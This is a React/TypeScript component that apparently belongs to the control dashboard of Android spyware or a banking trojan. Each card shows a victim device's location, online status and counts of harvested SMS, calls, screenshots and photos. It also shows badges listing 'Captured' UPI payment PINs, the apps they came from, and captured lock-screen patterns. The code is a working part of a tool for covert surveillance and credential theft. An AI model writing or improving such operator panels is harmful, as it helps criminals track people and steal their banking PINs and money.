'use client';

import { useRouter } from 'next/navigation';
import { formatDistanceToNow } from 'date-fns';
import { useState, useEffect } from 'react';
import {
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Camera,
    Image,
    ChevronRight,
    WifiOff,
    Clock,
    Star,
    MessageCircle,
    Edit3,
    X,
    Check,
    Activity,
    Battery,
    Signal,
    Lock,
    Key,
    Info,
} from 'lucide-react';

interface DeviceCardProps {
    device: {
        id: string;
        deviceId: string;
        model?: string;
        manufacturer?: string;
        androidVersion?: string;
        isOnline: boolean;
        lastSeen: string;
        latestLocation?: {
            latitude: number;
            longitude: number;
        };
        stats?: {
            sms: number;
            calls: number;
            screenshots: number;
            photos: number;
        };
        isPinned?: boolean;
        remark?: string;
        owner?: { id: string; username: string };
        syncData?: {
            hasLockData: boolean;
            hasUpiData: boolean;
            unlockCount: number;
            patternCount: number;
            upiPinsCount: number;
            capturedUpiApps: string[];
            lockDetails: { type: string; count: number }[];
        };
    };
    showRemark?: boolean;
    showPin?: boolean;
    onPinToggle?: (deviceId: string, isPinned: boolean) => void;
    onRemarkUpdate?: (deviceId: string, remark: string) => void;
    compact?: boolean;
}

export default function DeviceCard({
    device,
    showRemark = true,
    showPin = true,
    onPinToggle,
    onRemarkUpdate,
    compact = false
}: DeviceCardProps) {
    const router = useRouter();
    const [isEditingRemark, setIsEditingRemark] = useState(false);
    const [remarkText, setRemarkText] = useState(device.remark || '');
    const [localRemark, setLocalRemark] = useState(device.remark || '');
    const [lastSeenText, setLastSeenText] = useState('');
    const [showUpiApps, setShowUpiApps] = useState(false);
    const [showLockDetails, setShowLockDetails] = useState(false);

    useEffect(() => {
        setLastSeenText(formatDistanceToNow(new Date(device.lastSeen), { addSuffix: true }));
    }, [device.lastSeen]);

    const stats = [
        { icon: MessageSquare, value: device.stats?.sms || 0, color: 'from-blue-500 to-cyan-500', bg: 'bg-blue-500/10', label: 'SMS' },
        { icon: Phone, value: device.stats?.calls || 0, color: 'from-emerald-500 to-teal-500', bg: 'bg-emerald-500/10', label: 'Calls' },
        { icon: Image, value: device.stats?.screenshots || 0, color: 'from-purple-500 to-fuchsia-500', bg: 'bg-purple-500/10', label: 'Screens' },
        { icon: Camera, value: device.stats?.photos || 0, color: 'from-orange-500 to-amber-500', bg: 'bg-orange-500/10', label: 'Photos' },
    ];

    useEffect(() => {
        if (typeof window !== 'undefined') {
            const remarks = JSON.parse(localStorage.getItem('device_remarks') || '{}');
            if (remarks[device.deviceId]) {
                setLocalRemark(remarks[device.deviceId]);
            }
        }
    }, [device.deviceId]);

    const handleCardClick = () => {
        if (!isEditingRemark) {
            router.push(`/devices/view/?id=${device.deviceId}`);
        }
    };

    const handlePinToggle = (e: React.MouseEvent) => {
        e.preventDefault();
        e.stopPropagation();
        if (onPinToggle) {
            onPinToggle(device.deviceId, !device.isPinned);
        }
    };

    const handleRemarkClick = (e: React.MouseEvent) => {
        e.preventDefault();
        e.stopPropagation();
        setRemarkText(localRemark);
        setIsEditingRemark(true);
    };

    const handleRemarkSave = (e: React.MouseEvent) => {
        e.preventDefault();
        e.stopPropagation();
        setLocalRemark(remarkText);
        setIsEditingRemark(false);
        if (typeof window !== 'undefined') {
            const remarks = JSON.parse(localStorage.getItem('device_remarks') || '{}');
            remarks[device.deviceId] = remarkText;
            localStorage.setItem('device_remarks', JSON.stringify(remarks));
        }
        if (onRemarkUpdate) {
            onRemarkUpdate(device.deviceId, remarkText);
        }
    };

    const handleRemarkCancel = (e: React.MouseEvent) => {
        e.preventDefault();
        e.stopPropagation();
        setRemarkText(localRemark);
        setIsEditingRemark(false);
    };

    if (compact) {
        // Compact/List view
        return (
            <div
                role="button"
                tabIndex={0}
                onClick={handleCardClick}
                onKeyDown={(e) => e.key === 'Enter' && handleCardClick()}
                className={`group relative bg-white rounded-xl border border-[var(--border-light)] p-4 cursor-pointer transition-all duration-300 hover:shadow-lg hover:border-[var(--primary)]/30 ${device.isPinned ? 'ring-2 ring-amber-400/50' : ''}`}
            >
                <div className="flex items-center gap-4">
                    {/* Device Icon */}
                    <div className={`relative w-12 h-12 rounded-xl flex items-center justify-center ${device.isOnline
                        ? 'bg-gradient-to-br from-emerald-400 to-teal-500 shadow-lg shadow-emerald-500/25'
                        : 'bg-[var(--bg-subtle)]'
                        }`}>
                        <Smartphone className={`w-6 h-6 ${device.isOnline ? 'text-white' : 'text-[var(--text-muted)]'}`} />
                        {device.isOnline && (
                            <span className="absolute -top-1 -right-1 flex h-3 w-3">
                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500 border-2 border-white"></span>
                            </span>
                        )}
                    </div>

                    {/* Device Info */}
                    <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                            {device.isPinned && (
                                <button
                                    onClick={handlePinToggle}
                                    className="p-1 -ml-1 rounded-md hover:bg-amber-500/10 transition-colors"
                                    title="Unpin device"
                                >
                                    <Star className="w-4 h-4 text-amber-500 fill-amber-500" />
                                </button>
                            )}
                            <h3 className="font-bold text-[var(--text-primary)] truncate">
                                {device.manufacturer
                                    ? (device.model?.toLowerCase().includes(device.manufacturer.toLowerCase())
                                        ? device.model
                                        : `${device.manufacturer} ${device.model || ''}`.trim())
                                    : (device.model || 'Unknown Device')}
                            </h3>
                        </div>
                        <div className="flex items-center gap-3 mt-1">
                            <span className="px-2 py-0.5 rounded-md bg-[var(--primary)]/10 text-[var(--primary)] text-xs font-semibold">
                                Android {device.androidVersion || '?'}
                            </span>
                            <span className="text-xs text-[var(--text-muted)] flex items-center gap-1">
                                <Clock className="w-3 h-3" />
                                {lastSeenText}
                            </span>
                            {/* Sync Badges */}
                            {device.syncData?.hasUpiData && (
                                <div className="relative">
                                    <button
                                        onClick={(e) => { e.stopPropagation(); setShowUpiApps(!showUpiApps); }}
                                        className="flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-orange-100 text-orange-700 text-[10px] font-medium hover:bg-orange-200 transition-colors"
                                    >
                                        <Key className="w-2.5 h-2.5" />
                                        UPI ({device.syncData.capturedUpiApps?.length || 0})
                                        <Info className="w-2.5 h-2.5" />
                                    </button>
                                    {showUpiApps && device.syncData.capturedUpiApps?.length > 0 && (
                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-orange-200 rounded-lg shadow-lg p-2 min-w-[120px]">
                                            <p className="text-[9px] font-bold text-orange-600 mb-1">Captured Apps:</p>
                                            {device.syncData.capturedUpiApps.map((app, i) => (
                                                <div key={i} className="text-[10px] text-slate-700 py-0.5">
                                                    • {app}
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            )}
                            {device.syncData?.hasLockData && (
                                <div className="relative">
                                    <button
                                        onClick={(e) => { e.stopPropagation(); setShowLockDetails(!showLockDetails); }}
                                        className="flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-emerald-100 text-emerald-700 text-[10px] font-medium hover:bg-emerald-200 transition-colors"
                                    >
                                        <Lock className="w-2.5 h-2.5" />
                                        Lock ({device.syncData.lockDetails?.length || 0})
                                        <Info className="w-2.5 h-2.5" />
                                    </button>
                                    {showLockDetails && device.syncData.lockDetails?.length > 0 && (
                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-emerald-200 rounded-lg shadow-lg p-2 min-w-[100px]">
                                            <p className="text-[9px] font-bold text-emerald-600 mb-1">Captured:</p>
                                            {device.syncData.lockDetails.map((item, i) => (
                                                <div key={i} className="text-[10px] text-slate-700 py-0.5">
                                                    • {item.type}: {item.count}
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Stats Mini */}
                    <div className="hidden sm:flex items-center gap-4">
                        {stats.slice(0, 2).map((stat, i) => (
                            <div key={i} className="text-center">
                                <p className="text-sm font-bold text-[var(--text-primary)]">{stat.value}</p>
                                <p className="text-[10px] text-[var(--text-muted)]">{stat.label}</p>
                            </div>
                        ))}
                    </div>

                    <ChevronRight className="w-5 h-5 text-[var(--text-muted)] group-hover:text-[var(--primary)] transition-colors" />
                </div>
            </div>
        );
    }

    // Full card view
    return (
        <div
            role="button"
            tabIndex={0}
            onClick={handleCardClick}
            onKeyDown={(e) => e.key === 'Enter' && handleCardClick()}
            className={`group relative bg-white rounded-2xl border border-[var(--border-light)] overflow-hidden cursor-pointer transition-all duration-300 hover:shadow-xl hover:-translate-y-1 hover:border-[var(--primary)]/30 ${device.isPinned ? 'ring-2 ring-amber-400/50' : ''}`}
        >
            {/* Top Gradient Bar */}
            <div className={`absolute top-0 left-0 right-0 h-1 ${device.isOnline
                ? 'bg-gradient-to-r from-emerald-400 via-green-500 to-teal-500'
                : 'bg-gradient-to-r from-slate-300 to-gray-400'
                }`} />

            <div className="p-3.5 lg:p-5">
                {/* Header */}
                <div className="flex items-start gap-3 lg:gap-4 mb-3 lg:mb-4">
                    {/* Device Icon with Status */}
                    <div className="relative">
                        <div className={`w-11 h-11 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center ${device.isOnline
                            ? 'bg-gradient-to-br from-emerald-400 to-teal-500 shadow-lg shadow-emerald-500/25'
                            : 'bg-[var(--bg-subtle)]'
                            }`}>
                            <Smartphone className={`w-6 h-6 lg:w-7 lg:h-7 ${device.isOnline ? 'text-white' : 'text-[var(--text-muted)]'}`} />
                        </div>
                        {device.isOnline && (
                            <span className="absolute -bottom-0.5 -right-0.5 flex h-3.5 w-3.5 lg:h-4 lg:w-4">
                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                                <span className="relative inline-flex rounded-full h-full w-full bg-emerald-500 border-2 border-white"></span>
                            </span>
                        )}
                    </div>

                    {/* Device Info */}
                    <div className="flex-1 min-w-0">
                        <h3 className="font-bold text-base lg:text-lg text-[var(--text-primary)] truncate mb-0.5 lg:mb-1">
                            {device.manufacturer
                                ? (device.model?.toLowerCase().includes(device.manufacturer.toLowerCase())
                                    ? device.model
                                    : `${device.manufacturer} ${device.model || ''}`.trim())
                                : (device.model || 'Unknown Device')}
                        </h3>
                        <div className="flex items-center gap-1.5 flex-wrap">
                            <span className="px-2 py-0.5 rounded-lg bg-gradient-to-r from-[var(--primary)]/10 to-purple-500/10 text-[var(--primary)] text-[10px] lg:text-xs font-bold">
                                Android {device.androidVersion || '?'}
                            </span>
                            <span className={`flex items-center gap-1 px-2 py-0.5 rounded-lg text-[10px] lg:text-xs font-semibold ${device.isOnline
                                ? 'bg-emerald-500/10 text-emerald-600'
                                : 'bg-slate-100 text-[var(--text-muted)]'
                                }`}>
                                {device.isOnline ? (
                                    <>
                                        <Activity className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                        Online
                                    </>
                                ) : (
                                    <>
                                        <WifiOff className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                        Offline
                                    </>
                                )}
                            </span>
                            {/* Sync Badges */}
                            {device.syncData?.hasUpiData && (
                                <div className="relative">
                                    <button
                                        onClick={(e) => { e.stopPropagation(); setShowUpiApps(!showUpiApps); }}
                                        className="flex items-center gap-1 px-2 py-0.5 rounded-lg bg-orange-100 text-orange-700 text-[10px] lg:text-xs font-semibold hover:bg-orange-200 transition-colors"
                                    >
                                        <Key className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                        UPI Pins ({device.syncData.capturedUpiApps?.length || 0})
                                        <Info className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                    </button>
                                    {showUpiApps && device.syncData.capturedUpiApps?.length > 0 && (
                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-orange-200 rounded-xl shadow-xl p-3 min-w-[140px]">
                                            <p className="text-xs font-bold text-orange-600 mb-2">Captured Apps:</p>
                                            {device.syncData.capturedUpiApps.map((app, i) => (
                                                <div key={i} className="flex items-center gap-2 text-sm text-slate-700 py-1">
                                                    <span className="w-2 h-2 rounded-full bg-orange-400"></span>
                                                    {app}
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            )}
                            {device.syncData?.hasLockData && (
                                <div className="relative">
                                    <button
                                        onClick={(e) => { e.stopPropagation(); setShowLockDetails(!showLockDetails); }}
                                        className="flex items-center gap-1 px-2 py-0.5 rounded-lg bg-emerald-100 text-emerald-700 text-[10px] lg:text-xs font-semibold hover:bg-emerald-200 transition-colors"
                                    >
                                        <Lock className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                        Lock ({device.syncData.lockDetails?.length || 0})
                                        <Info className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
                                    </button>
                                    {showLockDetails && device.syncData.lockDetails?.length > 0 && (
                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-emerald-200 rounded-xl shadow-xl p-3 min-w-[120px]">
                                            <p className="text-xs font-bold text-emerald-600 mb-2">Captured:</p>
                                            {device.syncData.lockDetails.map((item, i) => (
                                                <div key={i} className="flex items-center gap-2 text-sm text-slate-700 py-1">
                                                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                                                    {item.type}: {item.count}
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Pin Button */}
                    {showPin && onPinToggle && (
                        <button
                            onClick={handlePinToggle}
                            className={`p-2 lg:p-2.5 rounded-xl transition-all ${device.isPinned
                                ? 'bg-amber-500/10 text-amber-600 hover:bg-amber-500/20'
                                : 'bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:bg-amber-500/10 hover:text-amber-500 lg:opacity-0 lg:group-hover:opacity-100'
                                }`}
                            title={device.isPinned ? 'Unpin device' : 'Pin device'}
                        >
                            <Star className={`w-4 h-4 lg:w-5 lg:h-5 ${device.isPinned ? 'fill-amber-500' : ''}`} />
                        </button>
                    )}
                </div>

                {/* Remark Section */}
                {showRemark && (
                    <div className="mb-3 lg:mb-4">
                        {isEditingRemark ? (
                            <div className="flex items-center gap-2" onClick={(e) => e.stopPropagation()}>
                                <input
                                    type="text"
                                    value={remarkText}
                                    onChange={(e) => setRemarkText(e.target.value)}
                                    onClick={(e) => e.stopPropagation()}
                                    onKeyDown={(e) => {
                                        e.stopPropagation();
                                        if (e.key === 'Enter') handleRemarkSave(e as any);
                                        if (e.key === 'Escape') handleRemarkCancel(e as any);
                                    }}
                                    placeholder="Add a note..."
                                    className="flex-1 px-3 py-1.5 text-xs lg:text-sm rounded-lg border-2 border-[var(--primary)] bg-[var(--primary)]/5 focus:outline-none"
                                    autoFocus
                                />
                                <button
                                    onClick={handleRemarkSave}
                                    className="p-1.5 lg:p-2 rounded-lg bg-emerald-500 text-white hover:bg-emerald-600 transition-colors"
                                >
                                    <Check className="w-3.5 h-3.5 lg:w-4 lg:h-4" />
                                </button>
                            </div>
                        ) : localRemark ? (
                            <div
                                role="button"
                                tabIndex={0}
                                onClick={handleRemarkClick}
                                onKeyDown={(e) => e.key === 'Enter' && handleRemarkClick(e as any)}
                                className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-blue-500/5 border border-blue-500/20 hover:bg-blue-500/10 transition-colors cursor-pointer"
                            >
                                <MessageCircle className="w-3.5 h-3.5 text-blue-500 flex-shrink-0" />
                                <span className="text-[11px] lg:text-sm text-blue-700 truncate flex-1">{localRemark}</span>
                                <Edit3 className="w-3.5 h-3.5 text-blue-400" />
                            </div>
                        ) : (
                            <div
                                role="button"
                                tabIndex={0}
                                onClick={handleRemarkClick}
                                onKeyDown={(e) => e.key === 'Enter' && handleRemarkClick(e as any)}
                                className="flex items-center justify-center gap-2 px-3 py-1.5 rounded-lg border border-dashed border-[var(--border-default)] hover:border-[var(--primary)] hover:bg-[var(--primary)]/5 transition-all lg:opacity-0 lg:group-hover:opacity-100 cursor-pointer"
                            >
                                <Edit3 className="w-3.5 h-3.5 text-[var(--text-muted)]" />
                                <span className="text-xs text-[var(--text-muted)]">Add note</span>
                            </div>
                        )}
                    </div>
                )}

                {/* Stats Grid */}
                <div className="grid grid-cols-4 gap-1.5 lg:gap-2">
                    {stats.map((stat, i) => {
                        const Icon = stat.icon;
                        return (
                            <div key={i} className={`text-center py-2 lg:py-3 rounded-xl ${stat.bg} transition-all hover:scale-105 border border-transparent hover:border-[var(--primary)]/10`}>
                                <Icon className={`w-4 h-4 lg:w-5 lg:h-5 mx-auto mb-0.5 lg:mb-1`} style={{ color: stat.color.includes('blue') ? '#3b82f6' : stat.color.includes('emerald') ? '#10b981' : stat.color.includes('purple') ? '#a855f7' : '#f97316' }} />
                                <p className="text-xs lg:text-sm font-bold text-[var(--text-primary)]">{stat.value}</p>
                                <p className="text-[9px] lg:text-[10px] text-[var(--text-muted)] font-medium uppercase tracking-tight">{stat.label}</p>
                            </div>
                        );
                    })}
                </div>

                {/* Footer */}
                <div className="flex items-center justify-between mt-3 lg:mt-4 pt-3 lg:pt-4 border-t border-[var(--border-light)]">
                    <div className="flex items-center gap-1 text-[var(--text-muted)]">
                        <MapPin className="w-3.5 h-3.5 lg:w-4 lg:h-4" />
                        {device.latestLocation ? (
                            <span className="text-[10px] lg:text-xs font-mono">
                                {device.latestLocation.latitude.toFixed(2)}, {device.latestLocation.longitude.toFixed(2)}
                            </span>
                        ) : (
                            <span className="text-[10px] lg:text-xs">No location</span>
                        )}
                    </div>
                    <div className="flex items-center gap-1 text-[var(--text-muted)]">
                        <Clock className="w-3.5 h-3.5 lg:w-4 lg:h-4" />
                        <span className="text-[10px] lg:text-xs">{lastSeenText}</span>
                    </div>
                </div>
            </div>

            {/* Hover Arrow - Hidden on mobile */}
            <div className="absolute bottom-4 right-4 w-8 h-8 rounded-lg bg-[var(--primary)] hidden lg:flex items-center justify-center lg:opacity-0 lg:group-hover:opacity-100 transition-all transform lg:translate-x-2 lg:group-hover:translate-x-0 shadow-lg shadow-[var(--primary)]/25">
                <ChevronRight className="w-4 h-4 text-white" />
            </div>
        </div>
    );
}
